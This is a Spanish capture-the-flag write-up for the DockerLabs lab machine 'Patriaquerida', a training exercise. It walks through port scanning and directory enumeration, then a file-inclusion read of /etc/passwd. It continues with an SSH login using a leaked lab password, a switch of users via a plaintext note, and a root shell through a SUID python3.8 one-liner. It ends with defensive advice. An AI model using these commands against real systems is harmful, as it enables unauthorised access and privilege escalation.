# Patriaquerida — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** JuanR  
**Fecha de creación:** 14/01/2025  
**Técnicas:** Gobuster · Path Traversal · Local File Inclusion · SSH · SUID · Python privilege escalation

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Path Traversal](#2-enumeración-web--path-traversal)
3. [Acceso SSH](#3-acceso-ssh)
4. [Movimiento lateral — usuario mario](#4-movimiento-lateral--usuario-mario)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh patriaquerida.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Enumeración web — Path Traversal

Enumeramos directorios con Gobuster:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Encontramos:

```text
/index.php
```

La página indica:

```text
No olvides revisar el archivo oculto en /var/www/html/hidden_pass
```

Probamos el parámetro vulnerable:

```text
http://172.17.0.2/index.php?page=/var/www/html/hidden_pass
```

Resultado:

```text
balu
```

El parámetro es vulnerable a **Path Traversal / LFI**.

Listamos usuarios leyendo `/etc/passwd`:

```text
http://172.17.0.2/index.php?page=/etc/passwd
```

Usuarios encontrados:

```text
pinguino
mario
```

---

## 3. Acceso SSH

Probamos la contraseña encontrada con los usuarios válidos.

Acceso correcto:

```bash
ssh pinguino@172.17.0.2
```

Contraseña:

```text
balu
```

---

## 4. Movimiento lateral — usuario mario

Dentro del sistema encontramos:

```text
nota_mario.txt
```

Leemos el contenido:

```bash
cat nota_mario.txt
```

Resultado:

```text
La contraseña de mario es: invitaaachopo
```

Cambiamos de usuario:

```bash
su mario
```

---

## 5. Escalada de privilegios

Buscamos binarios SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Encontramos:

```text
/usr/bin/python3.8
```

Consultamos GTFOBins y ejecutamos:

```bash
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Path Traversal / LFI | Lectura arbitraria de archivos |
| Contraseña expuesta en aplicación web | Acceso SSH |
| Credenciales almacenadas en texto plano | Movimiento lateral |
| Python con bit SUID | Escalada a root |

**Para defenderse:**

- Validar correctamente rutas y parámetros.
- Restringir acceso a archivos sensibles.
- No almacenar credenciales en texto plano.
- Auditar binarios con permisos SUID.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
